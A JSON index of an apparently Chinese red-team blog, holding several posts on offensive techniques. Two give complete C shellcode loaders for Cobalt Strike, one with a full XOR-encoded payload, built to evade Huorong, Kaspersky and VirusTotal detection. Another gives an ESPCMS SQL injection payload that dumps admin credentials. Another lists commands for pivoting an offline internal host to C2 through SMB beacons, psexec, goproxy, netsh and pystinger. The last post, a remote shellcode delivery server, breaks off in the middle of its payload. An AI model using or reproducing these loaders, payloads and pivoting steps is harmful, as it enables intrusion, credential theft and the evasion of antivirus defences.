{"pages":[{"title":"标签","text":"","link":"/tags/index.html"},{"title":"分类","text":"","link":"/categories/index.html"}],"posts":[{"title":"C编译shellcode+shielden加壳免杀火绒、卡巴斯基","text":"CS 生成 shellcode在Payload Generator处选择veil，生成shellcode 生成shellcode 使用Visual Studio 2017编译shellcode复制shellcode到以下代码中 123456789101112131415// MSF.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。#include &lt;iostream&gt;#include &quot;stdio.h&quot;#include &quot;Windows.h&quot;#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;) //去除窗口//步骤b所在桌面产生的 shellcode.c的内容;unsigned char shellcode[] = &quot;&quot;;void main(){ //ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW); LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(Memory, shellcode, sizeof(shellcode)); ((void(*)())Memory)();} 在Visual Studio中新建控制台应用程序并复制代码 按如图设置编译选项 选择重新生成解决方案，生成ConsoleApplication4.exe 使用用Restorator 2018为生成的exe文件添加图标将ConsoleApplication4.exe拖入Restorator 2018，右键选择添加资源，名称可随意填写 将ico文件拖入Restorator 2018并保存 运用shielden为exe文件加壳设置如下 免杀效果virustotal.com上 shellcode_launcher.exe 查杀率为17/71 本地测试，静态扫描火绒与卡巴斯基均不查杀 cs上线 参考链接使用 C 编译 shellcode 免杀上线","link":"/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/"},{"title":"C编译xor加密shellcode免杀","text":"生成shellcodecs生成c格式shellcode 用010editor加密shellcodeCtrl+Shift+V将shellcode复制到010editor中，选择Tools-&gt;Hex Operation-&gt;Binary Xor，设置运算数为0x97,将shellcode与0x97异或后生成新的shellcode 将shellcode与0x97异或后生成新的shellcode Ctrl+Shift+c复制shellcode到Sublime text中，Ctrl+a选中全部将shellcode修改成c语言中的十六进制格式 Visual Studio编译生成exe文件将xor加密后的shellcode与0x97异或还原后执行 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void(_stdcall *CODE)();#pragma comment(linker,&quot;/subsystem:\\&quot;windows\\&quot; /entry:\\&quot;mainCRTStartup\\&quot;&quot;)unsigned char shellcode[] =&quot;\\x6B\\xDF\\x14\\x73\\x67\\x7F\\x5F\\x97\\x97\\x97\\xD6\\xC6\\xD6\\xC7\\xC5\\xC6&quot;&quot;\\xC1\\xDF\\xA6\\x45\\xF2\\xDF\\x1C\\xC5\\xF7\\xDF\\x1C\\xC5\\x8F\\xDF\\x1C\\xC5&quot;&quot;\\xB7\\xDF\\x1C\\xE5\\xC7\\xDF\\x98\\x20\\xDD\\xDD\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xAB\\xF6\\xEB\\x95\\xBB\\xB7\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\x75\\x7A&quot;&quot;\\xC5\\xD6\\xC6\\xDF\\x1C\\xC5\\xB7\\x1C\\xD5\\xAB\\xDF\\x96\\x47\\xF1\\x16\\xEF&quot;&quot;\\x8F\\x9C\\x95\\xE2\\xE5\\x1C\\x17\\x1F\\x97\\x97\\x97\\xDF\\x12\\x57\\xE3\\xF0&quot;&quot;\\xDF\\x96\\x47\\xC7\\x1C\\xDF\\x8F\\xD3\\x1C\\xD7\\xB7\\xDE\\x96\\x47\\x74\\xC1&quot;&quot;\\xDF\\x68\\x5E\\xD6\\x1C\\xA3\\x1F\\xDF\\x96\\x41\\xDA\\xA6\\x5E\\xDF\\xA6\\x57&quot;&quot;\\x3B\\xD6\\x56\\x5E\\x9A\\xD6\\x96\\x56\\xAF\\x77\\xE2\\x66\\xDB\\x94\\xDB\\xB3&quot;&quot;\\x9F\\xD2\\xAE\\x46\\xE2\\x4F\\xCF\\xD3\\x1C\\xD7\\xB3\\xDE\\x96\\x47\\xF1\\xD6&quot;&quot;\\x1C\\x9B\\xDF\\xD3\\x1C\\xD7\\x8B\\xDE\\x96\\x47\\xD6\\x1C\\x93\\x1F\\xDF\\x96&quot;&quot;\\x47\\xD6\\xCF\\xD6\\xCF\\xC9\\xCE\\xCD\\xD6\\xCF\\xD6\\xCE\\xD6\\xCD\\xDF\\x14&quot;&quot;\\x7B\\xB7\\xD6\\xC5\\x68\\x77\\xCF\\xD6\\xCE\\xCD\\xDF\\x1C\\x85\\x7E\\xD8\\x68&quot;&quot;\\x68\\x68\\xCA\\xFD\\x97\\xDE\\x29\\xE0\\xFE\\xF9\\xFE\\xF9\\xF2\\xE3\\x97\\xD6&quot;&quot;\\xC1\\xDE\\x1E\\x71\\xDB\\x1E\\x66\\xD6\\x2D\\xDB\\xE0\\xB1\\x90\\x68\\x42\\xDF&quot;&quot;\\xA6\\x5E\\xDF\\xA6\\x45\\xDA\\xA6\\x57\\xDA\\xA6\\x5E\\xD6\\xC7\\xD6\\xC7\\xD6&quot;&quot;\\x2D\\xAD\\xC1\\xEE\\x30\\x68\\x42\\x7C\\xE4\\xCD\\xDF\\x1E\\x56\\xD6\\x2F\\xC7&quot;&quot;\\x97\\x97\\x97\\xDA\\xA6\\x5E\\xD6\\xC6\\xD6\\xC6\\xFD\\x94\\xD6\\xC6\\xD6\\x2D&quot;&quot;\\xC0\\x1E\\x08\\x51\\x68\\x42\\x7C\\xCE\\xCC\\xDF\\x1E\\x56\\xDF\\xA6\\x45\\xDE&quot;&quot;\\x1E\\x4F\\xDA\\xA6\\x5E\\xC5\\xFF\\x97\\x95\\xD7\\x13\\xC5\\xC5\\xD6\\x2D\\x7C&quot;&quot;\\xC2\\xB9\\xAC\\x68\\x42\\xDF\\x1E\\x51\\xDF\\x14\\x54\\xC7\\xFD\\x9D\\xC8\\xDF&quot;&quot;\\x1E\\x66\\xDF\\x1E\\x4D\\xDE\\x50\\x57\\x68\\x68\\x68\\x68\\xDA\\xA6\\x5E\\xC5&quot;&quot;\\xC5\\xD6\\x2D\\xBA\\x91\\x8F\\xEC\\x68\\x42\\x12\\x57\\x98\\x12\\x0A\\x96\\x97&quot;&quot;\\x97\\xDF\\x68\\x58\\x98\\x13\\x1B\\x96\\x97\\x97\\x7C\\x44\\x7E\\x73\\x96\\x97&quot;&quot;\\x97\\x7F\\x35\\x68\\x68\\x68\\xB8\\xED\\xDE\\xD1\\xC3\\x97\\x78\\x6F\\xCF\\x9C&quot;&quot;\\xEF\\x6F\\x7B\\x00\\x38\\x66\\xFD\\xA8\\xFF\\x7B\\xCF\\xF8\\x9A\\x4B\\xA7\\x08&quot;&quot;\\x95\\x69\\x8B\\x57\\xDF\\x10\\xFE\\x9E\\xB6\\x17\\x81\\xB4\\xC6\\x50\\x5A\\xE7&quot;&quot;\\xFD\\x31\\x7C\\xF6\\x3A\\xD4\\xCA\\x4D\\xA2\\x00\\x6B\\xBF\\x1D\\xB4\\x62\\x1B&quot;&quot;\\xC6\\xA3\\x87\\x19\\xEE\\x2E\\xBA\\x2A\\x4B\\xD8\\x89\\x65\\xB2\\xF3\\xB0\\xC8&quot;&quot;\\xF3\\x1B\\x92\\x1A\\xFF\\x97\\xC2\\xE4\\xF2\\xE5\\xBA\\xD6\\xF0\\xF2\\xF9\\xE3&quot;&quot;\\xAD\\xB7\\xDA\\xF8\\xED\\xFE\\xFB\\xFB\\xF6\\xB8\\xA2\\xB9\\xA7\\xB7\\xBF\\xF4&quot;&quot;\\xF8\\xFA\\xE7\\xF6\\xE3\\xFE\\xF5\\xFB\\xF2\\xAC\\xB7\\xDA\\xC4\\xDE\\xD2\\xB7&quot;&quot;\\xA6\\xA7\\xB9\\xA7\\xAC\\xB7\\xC0\\xFE\\xF9\\xF3\\xF8\\xE0\\xE4\\xB7\\xD9\\xC3&quot;&quot;\\xB7\\xA1\\xB9\\xA5\\xAC\\xB7\\xC0\\xFE\\xF9\\xA1\\xA3\\xAC\\xB7\\xEF\\xA1\\xA3&quot;&quot;\\xAC\\xB7\\xC3\\xE5\\xFE\\xF3\\xF2\\xF9\\xE3\\xB8\\xA1\\xB9\\xA7\\xBE\\x9A\\x9D&quot;&quot;\\x97\\x64\\xF1\\xB2\\xFD\\x10\\x92\\x3B\\x83\\x57\\x64\\x8C\\xAA\\x47\\xD8\\x6B&quot;&quot;\\xB3\\xE3\\xBE\\xF9\\x75\\x1C\\xA5\\xD6\\x70\\x91\\xE2\\xF2\\x6A\\xA1\\xB6\\xF0&quot;&quot;\\x32\\x70\\x6D\\x9F\\xE9\\xD6\\x2F\\xA9\\x34\\x2F\\x15\\x73\\xD8\\x66\\x8F\\x20&quot;&quot;\\x1D\\x9A\\xCA\\xBF\\x50\\x3C\\x69\\x66\\xA7\\x99\\xB9\\x80\\xF3\\xEF\\x82\\x8E&quot;&quot;\\xC2\\xC5\\x9A\\x01\\xD2\\xDC\\x79\\x99\\xEE\\x32\\x4C\\x6C\\xB0\\x2E\\x1E\\xF0&quot;&quot;\\xCD\\x26\\x7C\\xE3\\x1D\\x78\\x82\\xF1\\xFD\\x88\\xB7\\x23\\x9D\\xCC\\x7A\\x5A&quot;&quot;\\xE5\\x46\\xF0\\xD7\\xCA\\xCC\\x3E\\xAB\\xF5\\x09\\xBB\\x3C\\x52\\x1E\\xAB\\x1A&quot;&quot;\\x3A\\x2F\\xF7\\x1E\\xF7\\xCF\\xA6\\x2B\\x93\\xBF\\xAB\\xFB\\xF7\\x44\\x2E\\xD8&quot;&quot;\\x69\\x64\\x26\\xD9\\xB6\\xB2\\xB9\\xDF\\xF6\\x27\\x52\\x8A\\x1A\\x26\\x81\\x14&quot;&quot;\\xFD\\xD6\\x88\\xD6\\x23\\x1F\\x6E\\xFC\\x09\\x30\\x57\\xEC\\x80\\xE1\\x14\\xF9&quot;&quot;\\x62\\x5A\\x84\\xA4\\x85\\xA1\\xC8\\xE2\\x43\\xFC\\x6E\\x18\\x95\\x90\\x7E\\x31&quot;&quot;\\x03\\x78\\x32\\x18\\x9A\\x89\\xDA\\xAF\\x84\\x5B\\x95\\x21\\x78\\xF4\\xA3\\x7F&quot;&quot;\\x82\\x36\\x32\\xE0\\x44\\x13\\x1A\\x39\\xE2\\x47\\xE7\\xED\\xA3\\x93\\x80\\x53&quot;&quot;\\x05\\xCC\\x5A\\xBD\\x3E\\x97\\xD6\\x29\\x67\\x22\\x35\\xC1\\x68\\x42\\xDF\\xA6&quot;&quot;\\x5E\\x2D\\x97\\x97\\xD7\\x97\\xD6\\x2F\\x97\\x87\\x97\\x97\\xD6\\x2E\\xD7\\x97&quot;&quot;\\x97\\x97\\xD6\\x2D\\xCF\\x33\\xC4\\x72\\x68\\x42\\xDF\\x04\\xC4\\xC4\\xDF\\x1E&quot;&quot;\\x70\\xDF\\x1E\\x66\\xDF\\x1E\\x4D\\xD6\\x2F\\x97\\xB7\\x97\\x97\\xDE\\x1E\\x6E&quot;&quot;\\xD6\\x2D\\x85\\x01\\x1E\\x75\\x68\\x42\\xDF\\x14\\x53\\xB7\\x12\\x57\\xE3\\x21&quot;&quot;\\xF1\\x1C\\x90\\xDF\\x96\\x54\\x12\\x57\\xE2\\x40\\xCF\\xCF\\xCF\\xDF\\x92\\x97&quot;&quot;\\x97\\x97\\x97\\xC7\\x54\\x7F\\x08\\x6A\\x68\\x68\\xA6\\xAE\\xA5\\xB9\\xA6\\xA1&quot;&quot;\\xAF\\xB9\\xA5\\xA7\\xA3\\xB9\\xA6\\xA3\\xA4\\x97\\x85\\xA3\\xC1\\xEF&quot;;unsigned char xorshellcode[sizeof(shellcode)];void main(){ for (int i = 0; i &lt; sizeof(shellcode) - 1; i++) { xorshellcode[i] = shellcode[i]^0x97; } PVOID p = NULL; p = VirtualAlloc(NULL, sizeof(xorshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (p == NULL) { return; } memcpy(p, xorshellcode, sizeof(xorshellcode)); CODE code = (CODE)p; code();} 免杀效果测试VirusTotal查杀率15/69 火绒不杀，卡巴斯基拦截 cs上线 参考:https://www.freebuf.com/articles/system/228233.html https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html","link":"/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/"},{"title":"espcms前台注入分析","text":"espcms前台注入分析《代码审计 企业级Web代码安全架构》一书中出现的cms，14年的老版本出现的Insert型注入。漏洞位于前台提交订单处 /interface/order.php $ptitle和$tsn为可控变量，通过accept方法获取参数 12$ptitle = $this-&gt;fun-&gt;accept('ptitle', 'P');$tsn = $this-&gt;fun-&gt;accept('tsn', 'P'); /public/class_function.php处找到accept函数的定义，从$_GET和$_POST数组中获取内容，并使用daddslashes函数过滤。 查看daddslashes函数声明，首先判断gpc是否开启，未开启则开启gpc，当$string为数组或为字符串时，调用addslashes对函数进行过滤并返回过滤后的$string 第373行拼接并执行了sql语句，可控变量$tsn和$ptitle未经过任何过滤就拼接到了sql语句中,这个 $tsn 和 $did $ptitle 都是可控的变量,相当于 $_POST[XXX] ，$tsn 不为数组时取值就会变成 $tsn{x}的方式 ，$temp = “abc”$temp[0]的值为a。$tsn参数提交一个*‘，经过daddslashes转义后自动添加*成'取$tsn[0]，为\\。可以利用这个来达到绕过转义的限制，来达到注入的目的。 正常请求的数据包，可以看到默认传递$ptitle[]和$tsn[]，%5B%5D为url编码后的[] 123456789101112131415POST /espcms/index.php?ac=order&amp;at=ordersave HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 541Origin: http://localhostConnection: closeReferer: http://localhost/espcms/index.php?ac=order&amp;at=orderpayCookie: cookieconsent_status=dismiss; Phpstorm-8e4b56ac=beb94186-86bf-4a9d-832a-863045cf4b2f; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1609381035; bdshare_firstime=1609381035017; Kffm_2132_saltkey=BgX15Dcg; Kffm_2132_lastvisit=1609472159; LankeMobile=p; ecisp_home_seccode=VneCeoRkPaRoYm1deaqUnow; ecisp_member_username=qtXCmg; ecisp_member_info=Z-LdZrRltZqompSolXLIpZqioo-c1J7eamZkZp2RbGxnbLVnZ2ZlaGKXbGxsspOclmObnm1nnJ6YaJtpb3Bnl2ZtYZTFb56abcJryJLGtJZkaJ2Wm51ka5yXmGhslGKRcJ9ybJObmpSWmW2TbseZ; PHPSESSID=fdcbb78c3f2f1dbfa3f269460137e63b; ecisp_order_list=l6CScLOnc2xvWJ5naFScmXNrcNysn2ScWpmamoicn3JmcHSocGlvU5POp66nqoN0zmuTc7Ku; ecisp_order_productmoney=aZiRZg; ecisp_order_sncode=aZ7CbZlpb25lm2lnamjDaXFpmZlxy2eXcWdlbpzHmJ4Upgrade-Insecure-Requests: 1userid=1&amp;productmoney=3200&amp;discount_productmoney=3200&amp;discountmoney=0&amp;tokenkey=85e30790ab01309cf9ba7c2cc40f03f8&amp;ptitle%5B%5D=HTC+Flyer+%E5%B9%B3%E6%9D%BF%E7%94%B5%E8%84%91&amp;tsn%5B%5D=SN20110830222536894&amp;bprice%5B%5D=3200.00&amp;oprice%5B%5D=3600.00&amp;did%5B%5D=27&amp;amount%5B%5D=1&amp;countprice%5B%5D=3200.00&amp;alias=rrr&amp;sex=0&amp;email=asdasd%40gmail.com&amp;tel=eeee&amp;mobile=eeee&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=eee&amp;zipcode=0&amp;sendtime=1&amp;osid=1&amp;opid=1&amp;content=&amp;invpayee=&amp;invcontent=&amp;submit=%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%E8%AE%A2%E5%8D%95 正常提交执行的sql语句 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,26,'','HTC S510e',3200,3100,3100,1,1) $tsn去掉[]后提交 \\ $ptitle[]提交 ,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)# ​ $tsn与$ptitle均有单引号包裹，拼接到sql语句中$tsn与$ptitle默认被当作数组处理，当$tsn为字符串时,尝试提交$tsn内容为‘，经过accept函数处理，daddslashes函数转义后$tsn为\\‘**并拼接到sql语句中，原本包裹$tsn的后一个引号被转义，$tsn的前一个引号与$ptitle的前一个引号闭合，相当于$tsn实际内容为‘\\‘,’** ​ 注入执行的sql语句如下 1INSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (12,36,'\\',',(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#',3200,3100,3100,1,1) 在提交订单时候用burpsuite抓包并修改 利用成功 参考： https://www.uedbox.com/post/25828/ https://www.seebug.org/vuldb/ssvid-94423","link":"/2021/01/06/espcms%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"},{"title":"不出网主机上线方法","text":"测试环境假设192.168.111.0/24为公网ip段，192.168.204.0/24为内网ip段 web服务器 Windows 2008 r2DMZ主机 虚拟机两块网卡一块设置为NAT模式，一块设置为HOSTONLY模式，可通外网 公网ip:192.168.111.132 内网ip:192.168.204.188 内网主机 Windows 2012虚拟机网卡设置HOSTONLY模式，不通外网 内网ip:192.168.204.141 C2： Kali Linux公网ip：192.168.111.129 1.SMB beacon​ SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。 ​ 首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线 使用条件 1.具有 SMB Beacon 的主机必须接受 445 端口上的连接。 2.只能链接由同一个 Cobalt Strike 实例管理的 Beacon。 3.利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。 使用方法web服务器上线cs，run mimikatz抓取密码 建立listener，选择SMB beacon 在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限 连接成功，可以看到smb beacon上线的主机右侧有∞∞标识 2.配置listener通过HTTP代理上线使用goproxy搭建代理goproxy 上传proxy.exe到web服务器，在8080端口开启http代理 1shell C:\\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon 用netsh命令把外网ip的8080端口转发到内网ip的192.168.204.188的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用 1shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080 检测端口是否启用 1netstat -ano | findstr :822 创建listener设置如下 生成stageless payload关于stage 和 stageless的区别： 探寻Metasploit Payload模式背后的秘密 stager分阶段，第一阶段申请内存，第二件阶段向C2发起请求并接受shellcode执行 stageless不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线 成功上线 连接过程 192.168.204.141 → 192.168.204.188:822→ 192.168.111.132:8080→ C2 3.使用pystinger搭建socks4代理pystinger 原理来源:红队攻防实践：不出网主机搭建内网隧道新思路 服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量 使用方法上传proxy.php到网站目录，正常访问返回UTF-8 上传stinger_server.exe，执行 1start stinger_server.exe 0.0.0.0 Kali上执行 1./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000 cs中新建listener，192.168.204.188为web服务器内网ip，60020为转发端口 使用psexec横向移动，选择listener为stinger，成功上线 参考：Cobalt Strike Listener with Proxy 红队攻防实践：不出网主机搭建内网隧道新思路 dns与smb beacon详解与一种内网穿透方法的实践 内网渗透：不出网渗透技巧https://www.freebuf.com/articles/web/247287.html)","link":"/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/"},{"title":"利用SOCKET分离shellcode","text":"原理客户端运行后向服务端发起请求接收xor运算后的shellcode还原后执行，达到远程加载shellcode的目的，与stager的功能有些类似。 服务端代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;WinSock2.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)using namespace std;int main(int argc, char* argv[]){ const int BUF_SIZE = 1024; WSADATA wsd; //WSADATA变量 SOCKET sServer; //服务器套接字 SOCKET sClient; //客户端套接字 SOCKADDR_IN addrServ;; //服务器地址 char buf[BUF_SIZE]; //接收数据缓冲区 char sendBuf[] = &quot;\\x6b\\xdf\\x14\\x73\\x67\\x7f\\x5f\\x97\\x97\\x97\\xd6\\xc6\\xd6\\xc7\\xc5\\xc6\\xc1\\xdf\\xa6\\x45\\xf2\\xdf\\x1c\\xc5\\xf7\\xdf\\x1c\\xc5\\x8f\\xdf\\x1c\\xc5\\xb7\\xdf\\x1c\\xe5\\xc7\\xdf\\x98\\x20\\xdd\\xdd\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xab\\xf6\\xeb\\x95\\xbb\\xb7\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\x75\\x7a\\xc5\\xd6\\xc6\\xdf\\x1c\\xc5\\xb7\\x1c\\xd5\\xab\\xdf\\x96\\x47\\xf1\\x16\\xef\\x8f\\x9c\\x95\\xe2\\xe5\\x1c\\x17\\x1f\\x97\\x97\\x97\\xdf\\x12\\x57\\xe3\\xf0\\xdf\\x96\\x47\\xc7\\x1c\\xdf\\x8f\\xd3\\x1c\\xd7\\xb7\\xde\\x96\\x47\\x74\\xc1\\xdf\\x68\\x5e\\xd6\\x1c\\xa3\\x1f\\xdf\\x96\\x41\\xda\\xa6\\x5e\\xdf\\xa6\\x57\\x3b\\xd6\\x56\\x5e\\x9a\\xd6\\x96\\x56\\xaf\\x77\\xe2\\x66\\xdb\\x94\\xdb\\xb3\\x9f\\xd2\\xae\\x46\\xe2\\x4f\\xcf\\xd3\\x1c\\xd7\\xb3\\xde\\x96\\x47\\xf1\\xd6\\x1c\\x9b\\xdf\\xd3\\x1c\\xd7\\x8b\\xde\\x96\\x47\\xd6\\x1c\\x93\\x1f\\xdf\\x96\\x47\\xd6\\xcf\\xd6\\xcf\\xc9\\xce\\xcd\\xd6\\xcf\\xd6\\xce\\xd6\\xcd\\xdf\\x14\\x7b\\xb7\\xd6\\xc5\\x68\\x77\\xcf\\xd6\\xce\\xcd\\xdf\\x1c\\x85\\x7e\\xd8\\x68\\x68\\x68\\xca\\xfd\\x97\\xde\\x29\\xe0\\xfe\\xf9\\xfe\\xf9\\xf2\\xe3\\x97\\xd6\\xc1\\xde\\x1e\\x71\\xdb\\x1e\\x66\\xd6\\x2d\\xdb\\xe0\\xb1\\x90\\x68\\x42\\xdf\\xa6\\x5e\\xdf\\xa6\\x45\\xda\\xa6\\x57\\xda\\xa6\\x5e\\xd6\\xc7\\xd6\\xc7\\xd6\\x2d\\xad\\xc1\\xee\\x30\\x68\\x42\\x7c\\xe4\\xcd\\xdf\\x1e\\x56\\xd6\\x2f\\xc7\\x97\\x97\\x97\\xda\\xa6\\x5e\\xd6\\xc6\\xd6\\xc6\\xfd\\x94\\xd6\\xc6\\xd6\\x2d\\xc0\\x1e\\x08\\x51\\x68\\x42\\x7c\\xce\\xcc\\xdf\\x1e\\x56\\xdf\\xa6\\x45\\xde\\x1e\\x4f\\xda\\xa6\\x5e\\xc5\\xff\\x97\\x95\\xd7\\x13\\xc5\\xc5\\xd6\\x2d\\x7c\\xc2\\xb9\\xac\\x68\\x42\\xdf\\x1e\\x51\\xdf\\x14\\x54\\xc7\\xfd\\x9d\\xc8\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xde\\x50\\x57\\x68\\x68\\x68\\x68\\xda\\xa6\\x5e\\xc5\\xc5\\xd6\\x2d\\xba\\x91\\x8f\\xec\\x68\\x42\\x12\\x57\\x98\\x12\\x0a\\x96\\x97\\x97\\xdf\\x68\\x58\\x98\\x13\\x1b\\x96\\x97\\x97\\x7c\\x44\\x7e\\x73\\x96\\x97\\x97\\x7f\\x35\\x68\\x68\\x68\\xb8\\xff\\xd3\\xd9\\xf4\\x97\\x9b\\x88\\x75\\x09\\xbe\\x35\\xdc\\xd7\\x35\\x98\\xd0\\x2d\\xbe\\xa9\\x5b\\x83\\x00\\xa1\\xc6\\x5a\\xa4\\x4c\\xbd\\xd2\\x20\\xcc\\x66\\x45\\x97\\x24\\xda\\x15\\x40\\x32\\xe1\\xb7\\x8c\\xa2\\xfa\\xa2\\xa0\\x20\\x67\\x69\\x1c\\x02\\xe1\\x54\\x4e\\x8a\\x79\\x2c\\xf0\\xa7\\x4b\\x7d\\xd5\\xb9\\x3d\\xee\\x1a\\x4a\\xf5\\xa7\\x74\\x8d\\x66\\xed\\x9a\\x43\\xf5\\x3f\\x5a\\x97\\xc2\\xe4\\xf2\\xe5\\xba\\xd6\\xf0\\xf2\\xf9\\xe3\\xad\\xb7\\xda\\xf8\\xed\\xfe\\xfb\\xfb\\xf6\\xb8\\xa3\\xb9\\xa7\\xb7\\xbf\\xf4\\xf8\\xfa\\xe7\\xf6\\xe3\\xfe\\xf5\\xfb\\xf2\\xac\\xb7\\xda\\xc4\\xde\\xd2\\xb7\\xaf\\xb9\\xa7\\xac\\xb7\\xc0\\xfe\\xf9\\xf3\\xf8\\xe0\\xe4\\xb7\\xd9\\xc3\\xb7\\xa2\\xb9\\xa6\\xac\\xb7\\xc3\\xe5\\xfe\\xf3\\xf2\\xf9\\xe3\\xb8\\xa3\\xb9\\xa7\\xac\\xb7\\xb9\\xd9\\xd2\\xc3\\xb7\\xd4\\xdb\\xc5\\xb7\\xa6\\xb9\\xa6\\xb9\\xa3\\xa4\\xa5\\xa5\\xac\\xb7\\xd5\\xd8\\xde\\xd2\\xaf\\xac\\xd2\\xd9\\xc2\\xc4\\xbe\\x9a\\x9d\\x97\\xba\\x40\\x2a\\xb6\\xce\\x2c\\x01\\xae\\x0c\\x64\\x70\\x02\\xfb\\xbf\\x3b\\x14\\x9d\\x54\\xb9\\x76\\xe2\\x9c\\x2a\\x5d\\x28\\x08\\x2f\\xcd\\x21\\x52\\x5c\\x57\\xe0\\xfd\\x14\\x8a\\x95\\xaf\\x66\\xc1\\x23\\x70\\x97\\xe4\\xb2\\xd6\\xf7\\xd0\\x3a\\xf6\\xf7\\xcd\\x87\\x96\\xb2\\x0f\\xef\\x11\\x6b\\x1c\\x22\\x4d\\xc4\\xed\\x65\\xce\\x0a\\xab\\x30\\x94\\xd2\\xdc\\x8d\\xbf\\x3a\\xa6\\xc9\\xe0\\x5e\\x93\\x89\\x10\\x47\\xfa\\x96\\xac\\xb7\\x70\\xdd\\x93\\x41\\x7b\\x62\\x5d\\x35\\xe1\\x35\\x8b\\x4a\\x50\\x07\\x38\\x1f\\xb8\\x10\\x92\\xe0\\x08\\xcb\\xdb\\x79\\x8c\\xbe\\x94\\xcb\\xc0\\xb2\\x70\\x70\\xac\\x36\\xbd\\x83\\x76\\x46\\xde\\xfc\\x4a\\xac\\x0b\\x30\\x69\\x57\\x05\\x69\\xac\\x1f\\xec\\xba\\x09\\x8f\\x62\\xe8\\x4f\\xcd\\xe2\\x35\\x07\\xbe\\xab\\xaf\\x7c\\x64\\x8a\\x01\\xf5\\x92\\xe2\\x9c\\xda\\x28\\x7f\\xd5\\xc3\\x0d\\xa3\\x8f\\x8b\\x97\\x63\\x34\\xfa\\x7e\\xe9\\xd7\\x5e\\x5b\\x7b\\xb5\\xb3\\x47\\xa8\\xe3\\x8f\\x37\\xd0\\x2a\\x30\\xb1\\xc0\\x32\\xe8\\xd9\\x53\\x97\\xd6\\x29\\x67\\x22\\x35\\xc1\\x68\\x42\\xdf\\xa6\\x5e\\x2d\\x97\\x97\\xd7\\x97\\xd6\\x2f\\x97\\x87\\x97\\x97\\xd6\\x2e\\xd7\\x97\\x97\\x97\\xd6\\x2d\\xcf\\x33\\xc4\\x72\\x68\\x42\\xdf\\x04\\xc4\\xc4\\xdf\\x1e\\x70\\xdf\\x1e\\x66\\xdf\\x1e\\x4d\\xd6\\x2f\\x97\\xb7\\x97\\x97\\xde\\x1e\\x6e\\xd6\\x2d\\x85\\x01\\x1e\\x75\\x68\\x42\\xdf\\x14\\x53\\xb7\\x12\\x57\\xe3\\x21\\xf1\\x1c\\x90\\xdf\\x96\\x54\\x12\\x57\\xe2\\x40\\xcf\\xcf\\xcf\\xdf\\x92\\x97\\x97\\x97\\x97\\xc7\\x54\\x7f\\x08\\x6a\\x68\\x68\\xa6\\xae\\xa5\\xb9\\xa6\\xa1\\xaf\\xb9\\xa6\\xa6\\xa6\\xb9\\xa6\\x